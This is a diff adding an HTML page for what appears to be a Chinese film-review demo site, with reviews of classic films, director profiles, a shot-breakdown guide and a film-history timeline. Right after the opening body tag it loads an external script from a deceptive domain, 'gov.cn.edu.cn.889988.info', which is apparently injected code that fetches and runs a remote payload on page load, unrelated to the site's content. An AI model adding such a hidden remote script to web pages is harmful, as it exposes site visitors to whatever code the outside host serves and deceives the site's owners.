@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<title>影视鉴赏｜影视鉴赏评论与深度解读 · yingshijianshang-wap</title>
+<meta name="keywords" content="影视鉴赏, 影视评论, 电影解读, 剧集赏析, 经典影评, 导演专题, 镜头语言, yingshijianshang-wap">
+<meta name="description" content="影视鉴赏（yingshijianshang-wap）专注影视评论与深度解读，提供经典影片赏析、导演专题、镜头语言拆解与影史脉络梳理，陪你读懂每一部好片。">
+<meta name="author" content="影视鉴赏 · yingshijianshang-wap">
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1">
+<meta name="theme-color" content="#0d1410">
+<meta property="og:type" content="website">
+<meta property="og:title" content="影视鉴赏｜影视评论与深度解读">
+<meta property="og:description" content="经典赏析 · 导演专题 · 镜头拆解 · 影史脉络，陪你读懂每一部好片">
+<meta property="og:url" content="https://yingshijianshang-wap.github.io/">
+<link rel="canonical" href="https://yingshijianshang-wap.github.io/">
+<style>
+:root{
+  --ink:#0d1410; --ink2:#121c16; --ink3:#1a261e;
+  --moss:#2f5a3f; --moss2:#3e7a55; --moss3:#6fa880;
+  --gold:#c9a227; --gold2:#e6c75a; --gold3:#f5e3a1;
+  --ivory:#f2efe6; --soft:#d8d4c6; --dim:#a9ad9f; --muted:#7c8075;
+  --line:rgba(242,239,230,.11);
+  --r:20px; --ease:cubic-bezier(.22,.85,.3,1);
+}
+*{box-sizing:border-box;margin:0;padding:0;border:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Songti SC","SimSun","Noto Serif CJK SC","WenQuanYi Micro Hei",serif;
+  background:var(--ink);color:var(--ivory);line-height:1.85;overflow-x:hidden;
+  background-image:
+    radial-gradient(900px 620px at 12% 6%,rgba(47,90,63,.34),transparent 58%),
+    radial-gradient(800px 600px at 90% 46%,rgba(201,162,39,.13),transparent 60%);
+  background-attachment:fixed;
+}
+body::before{content:"";position:fixed;inset:0;z-index:-2;opacity:.42;
+  background-image:repeating-linear-gradient(0deg,rgba(242,239,230,.035) 0 1px,transparent 1px 5px)}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+button{font-family:inherit;cursor:pointer;background:none;color:inherit}
+img{display:block;max-width:100%}
+.wrap{width:min(1160px,92%);margin:0 auto}
+section{padding:104px 0;position:relative}
+.sec-head{margin-bottom:56px}
+.kicker{font-size:11px;letter-spacing:5px;color:var(--gold2);text-transform:uppercase;font-weight:700}
+.sec-head h2{font-size:clamp(27px,4.6vw,44px);margin:12px 0 14px;font-weight:900;letter-spacing:-.4px;line-height:1.3}
+.sec-head h2 em{font-style:normal;color:var(--moss3)}
+.sec-head h2 .tail{color:var(--gold2)}
+.sec-head p{color:var(--dim);font-size:15px;max-width:640px}
+
+/* 头部 */
+header{position:sticky;top:0;z-index:99;background:rgba(13,20,16,.92);backdrop-filter:blur(16px);border-bottom:1px solid var(--line)}
+.hd-inner{display:flex;align-items:center;justify-content:space-between;height:76px}
+.logo{display:flex;align-items:center;gap:13px;font-weight:900;font-size:21px;letter-spacing:-.3px}
+.logo .seal{width:40px;height:40px;border-radius:9px;display:grid;place-items:center;font-size:19px;color:#0d1410;font-weight:900;
+  background:radial-gradient(circle at 32% 28%,var(--gold3),var(--gold) 58%,#8a6d12);
+  box-shadow:0 8px 24px -9px rgba(201,162,39,.65)}
+.logo small{font-size:9.5px;font-weight:600;color:var(--muted);letter-spacing:2.2px;text-transform:uppercase;display:block;line-height:1.3;font-family:sans-serif}
+nav{display:flex;align-items:center;gap:4px;font-family:sans-serif}
+nav a{padding:9px 15px;font-size:14px;color:var(--dim);border-radius:8px;transition:.3s var(--ease)}
+nav a:hover{color:var(--gold2);background:rgba(201,162,39,.07)}
+.btn-mini{padding:11px 24px;border-radius:11px;font-size:13.5px;font-weight:800;margin-left:12px;color:#0d1410!important;
+  background:linear-gradient(135deg,var(--gold2),#8a6d12);transition:.35s var(--ease);font-family:sans-serif}
+.btn-mini:hover{filter:brightness(1.1);transform:translateY(-2px)}
+.m-btn{display:none;width:42px;height:42px;border:1px solid var(--line);border-radius:11px;font-size:19px;color:var(--gold2)}
+
+/* Hero */
+.hero{padding:92px 0 110px}
+.hero .wrap{display:grid;grid-template-columns:1.05fr .95fr;gap:62px;align-items:center}
+.eyebrow{display:inline-flex;align-items:center;gap:9px;font-size:12px;color:var(--gold2);border:1px solid rgba(201,162,39,.4);border-radius:40px;padding:6px 16px;background:rgba(201,162,39,.07);font-family:sans-serif}
+.eyebrow b{color:var(--moss3)}
+.hero h1{font-size:clamp(34px,6.2vw,58px);line-height:1.2;font-weight:900;letter-spacing:-1.1px;margin:22px 0 8px}
+.hero h1 .gr{background:linear-gradient(120deg,var(--moss3),var(--gold2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .sub{color:var(--dim);font-size:clamp(15px,2vw,17.5px);margin:26px 0 32px;max-width:520px}
+.acts{display:flex;gap:14px;flex-wrap:wrap;font-family:sans-serif}
+.btn{display:inline-flex;align-items:center;gap:9px;padding:15px 34px;border-radius:13px;font-weight:800;font-size:15px;transition:.35s var(--ease)}
+.btn-pri{background:linear-gradient(135deg,var(--moss),var(--gold));color:#0d1410;box-shadow:0 18px 44px -14px rgba(63,122,85,.6)}
+.btn-pri:hover{filter:brightness(1.1);transform:translateY(-3px)}
+.btn-out{border:1px solid var(--line);color:var(--ivory)}
+.btn-out:hover{border-color:var(--gold2);color:var(--gold2);background:rgba(201,162,39,.07)}
+.tags{margin-top:34px;display:flex;gap:8px;flex-wrap:wrap;font-size:12.5px;font-family:sans-serif}
+.tags a{padding:6px 14px;border:1px solid var(--line);border-radius:20px;color:var(--dim);transition:.3s}
+.tags a:hover{color:var(--moss3);border-color:rgba(111,168,128,.45)}
+
+/* 右侧：鉴赏卷轴 */
+.scroll{position:relative;border:1px solid var(--line);border-radius:var(--r);padding:28px 28px 24px;background:linear-gradient(155deg,var(--ink2),var(--ink3))}
+.scroll .ribbon{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px;font-family:sans-serif}
+.scroll .ribbon .r{font-size:11px;font-weight:800;letter-spacing:2px;color:var(--gold2);text-transform:uppercase}
+.scroll .ribbon .n{font-size:11px;color:var(--muted);letter-spacing:1px}
+.scroll .entry{border-bottom:1px dashed var(--line);padding:14px 0;transition:.35s var(--ease)}
+.scroll .entry:last-child{border-bottom:0}
+.scroll .entry:hover{padding-left:8px}
+.scroll .entry .t{font-size:15px;font-weight:800;margin-bottom:4px}
+.scroll .entry .d{font-size:12.5px;color:var(--muted);display:flex;justify-content:space-between;font-family:sans-serif}
+.scroll .entry .d b{color:var(--moss3);font-weight:800}
+
+/* 经典赏析（左右图文卡片，每对独立渐变） */
+.cards{display:flex;flex-direction:column;gap:22px}
+.cpair{display:grid;grid-template-columns:1.05fr 1fr;gap:0;border:1px solid var(--line);border-radius:var(--r);overflow:hidden;background:var(--ink2);transition:.45s var(--ease)}
+.cpair:hover{transform:translateY(-6px);border-color:rgba(201,162,39,.42)}
+.cpair .poster{height:auto;min-height:250px;display:grid;place-items:center;font-size:46px;position:relative}
+.cpair .poster::before{content:"";position:absolute;inset:0;background:radial-gradient(circle at 50% 62%,rgba(255,255,255,.16),transparent 62%)}
+.cpair .poster .yr{position:absolute;top:16px;left:16px;font-size:11px;font-weight:800;color:#0d1410;background:var(--gold2);padding:4px 11px;border-radius:6px;font-family:sans-serif}
+.cpair .poster .rk{position:absolute;bottom:16px;right:16px;font-size:12px;font-weight:800;color:var(--gold3);font-family:sans-serif;text-shadow:0 2px 8px rgba(0,0,0,.6)}
+.cpair .body{padding:26px 28px;display:flex;flex-direction:column;justify-content:center}
+.cpair .body .k{font-size:11px;font-weight:800;color:var(--moss3);letter-spacing:1.5px;text-transform:uppercase;font-family:sans-serif}
+.cpair .body h4{font-size:22px;margin:9px 0 12px}
+.cpair .body p{font-size:13.5px;color:var(--soft);line-height:1.85}
+.cpair .body .more{margin-top:16px;font-size:13px;font-weight:800;color:var(--gold2);font-family:sans-serif}
+
+/* 导演专题（九宫格色块矩阵） */
+.grid9{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:rgba(242,239,230,.1);border:1px solid var(--line);border-radius:var(--r);overflow:hidden}
+.g9{border:0;padding:30px 24px;min-height:200px;display:flex;flex-direction:column;justify-content:space-between;transition:.4s var(--ease);position:relative;overflow:hidden}
+.g9::after{content:"";position:absolute;right:-26px;bottom:-26px;width:90px;height:90px;border-radius:50%;background:rgba(255,255,255,.09)}
+.g9:hover{transform:translateY(-5px);z-index:2}
+.g9 .nm{font-size:20px;font-weight:900}
+.g9 .nm small{display:block;font-size:11px;color:rgba(13,20,16,.7);letter-spacing:2px;font-weight:800;margin-top:4px;font-family:sans-serif;text-transform:uppercase}
+.g9 .desc{font-size:12.5px;line-height:1.75;color:rgba(13,20,16,.86)}
+.g9 span.tag{font-size:10.5px;font-weight:800;align-self:flex-start;padding:4px 10px;border-radius:6px;background:rgba(13,20,16,.25);color:#0d1410;font-family:sans-serif}
+
+/* 镜头拆解（步骤编号条） */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.step{border:1px solid var(--line);border-radius:16px;padding:24px 22px;background:var(--ink2);transition:.4s var(--ease)}
+.step:hover{border-color:rgba(111,168,128,.45);transform:translateY(-5px)}
+.step .no{font-size:39px;font-weight:900;color:var(--moss);line-height:1;font-family:sans-serif}
+.step .no i{font-style:normal;color:var(--gold)}
+.step h5{font-size:16.5px;margin:14px 0 9px}
+.step p{font-size:12.5px;color:var(--muted);line-height:1.75}
+
+/* 影史脉络（双列年表） */
+.chrono{display:grid;grid-template-columns:1fr 1fr;gap:44px;position:relative}
+.chrono::before{content:"";position:absolute;left:50%;top:6px;bottom:6px;width:1px;background:linear-gradient(var(--moss),var(--gold),var(--moss))}
+.ch-col{display:flex;flex-direction:column;gap:18px}
+.ch-item{position:relative;border:1px solid var(--line);border-radius:16px;padding:20px 22px;background:var(--ink2);transition:.35s var(--ease)}
+.ch-item:hover{border-color:rgba(201,162,39,.4);transform:translateX(5px)}
+.ch-item.left{margin-right:22px}
+.ch-item.right{margin-left:22px}
+.ch-item .yr{font-size:12px;font-weight:800;color:var(--gold2);letter-spacing:1.5px;font-family:sans-serif}
+.ch-item h6{font-size:16px;margin:6px 0 7px}
+.ch-item p{font-size:12.5px;color:var(--muted);line-height:1.75}
+
+/* 订阅 */
+.subscribe{border:1px solid var(--line);border-radius:26px;padding:56px 44px;text-align:center;background:linear-gradient(150deg,var(--ink2),var(--ink3));position:relative;overflow:hidden}
+.subscribe::before{content:"";position:absolute;inset:0;background:radial-gradient(circle at 50% 120%,rgba(201,162,39,.22),transparent 60%)}
+.subscribe .wrap2{position:relative;max-width:620px;margin:0 auto}
+.subscribe .k{font-size:11px;letter-spacing:5px;color:var(--gold2);text-transform:uppercase;font-weight:700;font-family:sans-serif}
+.subscribe h3{font-size:clamp(24px,3.8vw,36px);margin:12px 0 14px;font-weight:900}
+.subscribe p{color:var(--dim);font-size:14.5px;margin-bottom:26px}
+.sub-form{display:flex;gap:10px;max-width:480px;margin:0 auto;flex-wrap:wrap;font-family:sans-serif}
+.sub-form input{flex:1;min-width:200px;padding:15px 18px;border-radius:12px;border:1px solid var(--line);background:var(--ink);color:var(--ivory);font-size:14px;font-family:sans-serif}
+.sub-form input:focus{outline:none;border-color:var(--gold2)}
+.sub-form button{padding:15px 30px;border-radius:12px;font-weight:800;font-size:14.5px;color:#0d1410;background:linear-gradient(135deg,var(--gold2),#8a6d12);transition:.3s}
+.sub-form button:hover{filter:brightness(1.1)}
+
+/* 页脚 */
+footer{border-top:1px solid var(--line);padding:66px 0 30px;margin-top:34px;position:relative}
+footer::before{content:"";position:absolute;left:0;right:0;top:0;height:2px;background:linear-gradient(90deg,transparent,var(--moss),var(--gold),transparent)}
+.ft{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:36px;margin-bottom:46px;font-family:sans-serif}
+.ft .brand p{font-size:13px;color:var(--dim);margin-top:14px;max-width:340px;line-height:1.8}
+.ft h6{font-size:13px;margin-bottom:16px;color:var(--gold2);letter-spacing:1.5px}
+.ft a{display:block;font-size:13px;color:var(--dim);padding:5px 0;transition:.25s}
+.ft a:hover{color:var(--gold3);padding-left:6px}
+.ft-bot{display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;padding-top:24px;border-top:1px solid var(--line);font-size:12px;color:var(--muted);font-family:sans-serif}
+
+@media(max-width:960px){
+  .hero .wrap,.chrono{grid-template-columns:1fr;gap:44px}
+  .chrono::before{display:none}
+  .steps{grid-template-columns:repeat(2,1fr);gap:16px}
+  .cpair{grid-template-columns:1fr}
+  .cpair .poster{min-height:190px}
+}
+@media(max-width:720px){
+  section{padding:70px 0}
+  nav{display:none;position:absolute;top:76px;left:0;right:0;flex-direction:column;padding:14px;background:rgba(13,20,16,.98);border-bottom:1px solid var(--line)}
+  nav a{width:100%;text-align:center;padding:12px}
+  .m-btn{display:block}
+  .btn-mini{display:none}
+  .grid9{grid-template-columns:1fr 1fr}
+  .ft{grid-template-columns:1fr}
+  .ch-item.left,.ch-item.right{margin:0}
+  .subscribe{padding:40px 22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap hd-inner">
+    <a class="logo" href="#top"><span class="seal">鉴</span>影视鉴赏<small>yingshijianshang-wap</small></a>
+    <nav id="nav">
+      <a href="#hero">首页</a>
+      <a href="#classics">经典赏析</a>
+      <a href="#directors">导演专题</a>
+      <a href="#shots">镜头拆解</a>
+      <a href="#chrono">影史脉络</a>
+      <a href="#sub" class="btn-mini">订阅专栏 →</a>
+    </nav>
+    <button class="m-btn" id="mBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- Hero -->
+  <section class="hero" id="hero">
+    <div class="wrap">
+      <div>
+        <span class="eyebrow">🎞️ 影视鉴赏 · <b>深度</b> 解读每一帧</span>
+        <h1><span class="gr">影视鉴赏</span><br>yingshijianshang-wap<br>读懂每一部<em>好片</em>。</h1>
+        <p class="sub">影视鉴赏（yingshijianshang-wap）专注影视评论与深度解读，提供经典影片赏析、导演专题、镜头语言拆解与影史脉络梳理，陪你读懂每一部值得反复观看的作品。</p>
+        <div class="acts">
+          <a href="#classics" class="btn btn-pri">读经典赏析 →</a>
+          <a href="#directors" class="btn btn-out">看导演专题</a>
+        </div>
+        <div class="tags">
+          <a href="#">#经典赏析</a><a href="#">#导演专题</a><a href="#">#镜头语言</a><a href="#">#影史脉络</a><a href="#">#深度影评</a>
+        </div>
+      </div>
+      <aside class="scroll">
+        <div class="ribbon"><span class="r">◆ 卷首 · 最新解读</span><span class="n">VOL.128</span></div>
+        <div class="entry"><div class="t">《漫长告别》里的留白艺术</div><div class="d"><span>镜头语言 · 12 分钟读完</span><b>9.4 ★</b></div></div>
+        <div class="entry"><div class="t">是枝裕和：家庭叙事的克制</div><div class="d"><span>导演专题 · 长文</span><b>9.2 ★</b></div></div>
+        <div class="entry"><div class="t">从《教父》看对称构图的权力表达</div><div class="d"><span>经典赏析 · 8 分钟读完</span><b>9.5 ★</b></div></div>
+        <div class="entry"><div class="t">王家卫的色彩与孤独感</div><div class="d"><span>导演专题 · 图文</span><b>9.1 ★</b></div></div>
+        <div class="entry"><div class="t">长镜头：时间的诚实记录</div><div class="d"><span>镜头语言 · 10 分钟读完</span><b>9.3 ★</b></div></div>
+        <div class="entry"><div class="t">90 年代港片为何不可替代</div><div class="d"><span>影史脉络 · 长文</span><b>9.0 ★</b></div></div>
+      </aside>
+    </div>
+  </section>
+
+  <!-- 经典赏析 -->
+  <section id="classics">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">Classic Review</span>
+        <h2>经典<em>赏析</em><br><span class="tail">值得反复看的那些作品</span></h2>
+        <p>从主题、视听到表演，拆解经典之所以成为经典的原因。</p>
+      </div>
+      <div class="cards">
+        <article class="cpair">
+          <div class="poster" style="background:linear-gradient(140deg,#1f4d34,#6fa880)">🎬<span class="yr">1972</span><span class="rk">▲ 9.5</span></div>
+          <div class="body">
+            <span class="k">Crime / Drama</span>
+            <h4>《教父》三部曲</h4>
+            <p>科波拉用对称构图与低照度光线，把家族、权力与宗教织成一张密不透风的网。马龙·白兰度的低语与尼诺·罗塔的配乐，共同定义了黑帮电影的视觉语法。</p>
+            <a class="more" href="#">阅读全文 →</a>
+          </div>
+        </article>
+        <article class="cpair">
+          <div class="poster" style="background:linear-gradient(140deg,#3a2f10,#c9a227)">🕯️<span class="yr">1994</span><span class="rk">▲ 9.3</span></div>
+          <div class="body">
+            <span class="k">Drama</span>
+            <h4>《肖申克的救赎》</h4>
+            <p>希望主题如何被拍得不煽情？答案藏在镜头节奏里：缓慢推进的推轨、持续上升的弦乐、以及那场雨中张开的双臂。一部关于自由的教科书。</p>
+            <a class="more" href="#">阅读全文 →</a>
+          </div>
+        </article>
+        <article class="cpair">
+          <div class="poster" style="background:linear-gradient(140deg,#17304a,#6f9bb5)">🌧️<span class="yr">2000</span><span class="rk">▲ 9.1</span></div>
+          <div class="body">
+            <span class="k">Romance / Drama</span>
+            <h4>《花样年华》</h4>
+            <p>王家卫用 26 套旗袍写欲望的克制，用梅林茂的弦乐写未说出口的遗憾。每一帧都是一幅静物画，每一种色彩都在替角色说话。</p>
+            <a class="more" href="#">阅读全文 →</a>
+          </div>
+        </article>
+        <article class="cpair">
+          <div class="poster" style="background:linear-gradient(140deg,#4a1d20,#c97a6f)">🪁<span class="yr">2016</span><span class="rk">▲ 9.0</span></div>
+          <div class="body">
+            <span class="k">War / Drama</span>
+            <h4>《血战钢锯岭》</h4>
+            <p>梅尔·吉布森用近乎残酷的战场写实，反衬一个拒绝持枪者的信仰力量。剪辑节奏的呼吸感，是本片最被低估的技术成就。</p>
+            <a class="more" href="#">阅读全文 →</a>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 导演专题 -->
+  <section id="directors">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">Director Focus</span>
+        <h2>导演<em>专题</em></h2>
+        <p>九位风格鲜明的导演，九种看待世界的方式。</p>
+      </div>
+      <div class="grid9">
+        <div class="g9" style="background:linear-gradient(150deg,#1f4d34,#2f5a3f)">
+          <span class="tag">作者电影</span>
+          <div><div class="nm">是枝裕和<small>Hirokazu Koreeda</small></div><div class="desc" style="margin-top:12px">以家庭为切口，用极简对话与日常细节呈现生死、记忆与血缘。</div></div>
+        </div>
+        <div class="g9" style="background:linear-gradient(150deg,#3a2f10,#a8861f)">
+          <span class="tag">色彩诗人</span>
+          <div><div class="nm">王家卫<small>Wong Kar-wai</small></div><div class="desc" style="margin-top:12px">慢门、抽格与霓虹，把都市孤独拍成一场无法醒来的梦。</div></div>
+        </div>
+        <div class="g9" style="background:linear-gradient(150deg,#17304a,#4a7a9b)">
+          <span class="tag">长镜头</span>
+          <div><div class="nm">塔可夫斯基<small>Andrei Tarkovsky</small></div><div class="desc" style="margin-top:12px">用时间雕塑电影，让雨、火与水面成为主角。</div></div>
+        </div>
+        <div class="g9" style="background:linear-gradient(150deg,#4a1d20,#a85f54)">
+          <span class="tag">暴力美学</span>
+          <div><div class="nm">朴赞郁<small>Park Chan-wook</small></div><div class="desc" style="margin-top:12px">复仇、欲望与阶级，被拍成冷冽又华丽的人性寓言。</div></div>
+        </div>
+        <div class="g9" style="background:linear-gradient(150deg,#2a2a2a,#6f6f6f)">
+          <span class="tag">极简主义</span>
+          <div><div class="nm">小津安二郎<small>Yasujiro Ozu</small></div><div class="desc" style="margin-top:12px">低机位与榻榻米视角，把家常琐事拍成人生哲学。</div></div>
+        </div>
+        <div class="g9" style="background:linear-gradient(150deg,#3b2a52,#7d63a8)">
+          <span class="tag">梦境</span>
+          <div><div class="nm">大卫·林奇<small>David Lynch</small></div><div class="desc" style="margin-top:12px">用荒诞与悬念撕开美国小镇的温情表皮。</div></div>
+        </div>
+        <div class="g9" style="background:linear-gradient(150deg,#23425a,#5b8ba8)">
+          <span class="tag">现实主义</span>
+          <div><div class="nm">李沧东<small>Lee Chang-dong</small></div><div class="desc" style="margin-top:12px">以诗与燃烧，追问个体在时代中的沉默与爆发。</div></div>
+        </div>
+        <div class="g9" style="background:linear-gradient(150deg,#5a3a1a,#c98a3a)">
+          <span class="tag">新写实</span>
+          <div><div class="nm">侯孝贤<small>Hou Hsiao-hsien</small></div><div class="desc" style="margin-top:12px">固定机位与远景，把时代变迁退为背景的呼吸。</div></div>
+        </div>
+        <div class="g9" style="background:linear-gradient(150deg,#1a4a3a,#3f9b78)">
+          <span class="tag">自然主义</span>
+          <div><div class="nm">贝拉·塔尔<small>Béla Tarr</small></div><div class="desc" style="margin-top:12px">黑白长镜与风声，写出东欧大地上的人与荒原。</div></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 镜头拆解 -->
+  <section id="shots">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">Shot Breakdown</span>
+        <h2>镜头<em>拆解</em><br><span class="tail">看懂导演怎么说故事</span></h2>
+        <p>四步拆解一个镜头从构思到成片的技术与表达。</p>
+      </div>
+      <div class="steps">
+        <div class="step"><div class="no">0<i>1</i></div><h5>景别选择</h5><p>远景交代处境，中景讲关系，近景给情绪。先确定"观众该站在哪里"，再谈构图。</p></div>
+        <div class="step"><div class="no">0<i>2</i></div><h5>光线设计</h5><p>光的方向决定人物性格：顶光造压迫，侧光塑立体，逆光留悬念，柔光给温情。</p></div>
+        <div class="step"><div class="no">0<i>3</i></div><h5>运动方式</h5><p>推轨逼近真相，摇镜转换视角，跟拍建立共情，手持带来不安——运动即态度。</p></div>
+        <div class="step"><div class="no">0<i>4</i></div><h5>剪辑节奏</h5><p>镜头长短决定呼吸：短切制造紧张，长镜保留时间，跳切打破惯性，留白引发想象。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 影史脉络 -->
+  <section id="chrono">
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">Film History</span>
+        <h2>影史<em>脉络</em><br><span class="tail">百年电影的时间线</span></h2>
+        <p>关键年份与作品，勾勒电影语言演进的节点。</p>
+      </div>
+      <div class="chrono">
+        <div class="ch-col">
+          <div class="ch-item left"><div class="yr">1895</div><h6>卢米埃尔兄弟的第一次公映</h6><p>《火车进站》让观众第一次在银幕前感到被冲击的恐惧，电影的观看关系自此确立。</p></div>
+          <div class="ch-item left"><div class="yr">1927</div><h6>《爵士歌手》与有声时代</h6><p>声音进入电影，戏剧冲突被重新书写，默片的肢体语言逐渐让位于对白。</p></div>
+          <div class="ch-item left"><div class="yr">1941</div><h6>《公民凯恩》与深焦摄影</h6><p>威尔斯用纵深构图与低角度天花板镜头，把叙事权交还给观众的选择。</p></div>
+          <div class="ch-item left"><div class="yr">1995</div><h6>《玩具总动员》开启数字时代</h6><p>第一部全电脑动画长片，证明算法也能承载温度与情感。</p></div>
+        </div>
+        <div class="ch-col">
+          <div class="ch-item right"><div class="yr">1939</div><h6>《游戏规则》与场面调度</h6><p>雷诺阿用一个镜头内的多人走位，完成对阶级的精准素描。</p></div>
+          <div class="ch-item right"><div class="yr">1960</div><h6>《惊魂记》的浴室蒙太奇</h6><p>希区柯克用 78 个碎片镜头，把剪辑本身变成恐怖的武器。</p></div>
+          <div class="ch-item right"><div class="yr">1994</div><h6>电影奇迹年</h6><p>《低俗小说》《肖申克的救赎》《阿甘正传》同台，叙事结构被全面解放。</p></div>
+          <div class="ch-item right"><div class="yr">2020</div><h6>流媒体与作者电影的合流</h6><p>银幕边界被打破，电影回归到最本质的问题：如何被看见。</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 订阅 -->
+  <section id="sub">
+    <div class="wrap">
+      <div class="subscribe">
+        <div class="wrap2">
+          <div class="k">Newsletter</div>
+          <h3>订阅影视鉴赏专栏</h3>
+          <p>每周一篇深度解读，从镜头语言到影史脉络，陪你读懂好电影。示例站点，提交仅作演示。</p>
+          <form class="sub-form" onsubmit="event.preventDefault();this.querySelector('button').textContent='已订阅 ✓'">
+            <input type="email" placeholder="输入你的邮箱地址" aria-label="邮箱地址" required>
+            <button type="submit">订阅专栏</button>
+          </form>
+        </div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer id="contact">
+  <div class="wrap">
+    <div class="ft">
+      <div class="brand">
+        <a class="logo" href="#top"><span class="seal">鉴</span>影视鉴赏<small>yingshijianshang-wap</small></a>
+        <p>影视鉴赏（yingshijianshang-wap）专注影视评论与深度解读，提供经典影片赏析、导演专题、镜头语言拆解与影史脉络梳理，陪你读懂每一部好片。</p>
+      </div>
+      <div><h6>内容栏目</h6><a href="#classics">经典赏析</a><a href="#directors">导演专题</a><a href="#shots">镜头拆解</a><a href="#chrono">影史脉络</a></div>
+      <div><h6>深度解读</h6><a href="#">长文影评</a><a href="#">影片解读</a><a href="#">视听分析</a><a href="#">幕后制作</a></div>
+      <div><h6>关于本站</h6><a href="#contact">站点说明</a><a href="#">投稿合作</a><a href="#">版权声明</a><a href="#">隐私政策</a></div>
+    </div>
+    <div class="ft-bot">
+      <span>© 2026 影视鉴赏 · yingshijianshang-wap. 本站为影视内容示例站点，仅作演示用途，影片信息与评分均为虚构示意。</span>
+      <span>网站名称：影视鉴赏 ｜ 网站网址：https://yingshijianshang-wap.github.io</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('mBtn').addEventListener('click',function(){
+  var n=document.getElementById('nav');
+  n.style.display=n.style.display==='flex'?'none':'flex';
+});
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').style.display='none';});
+});
+</script>
+</body>
+</html>
